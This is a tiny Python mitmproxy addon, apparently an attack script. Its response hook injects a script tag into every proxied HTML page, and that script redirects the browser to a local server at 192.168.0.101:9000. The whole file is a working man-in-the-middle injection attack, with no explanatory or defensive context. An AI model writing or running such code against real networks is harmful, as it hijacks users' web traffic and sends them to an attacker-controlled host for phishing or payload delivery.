import mitmproxy
def response(flow):
    flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://192.168.0.101:9000'</script>")
                

                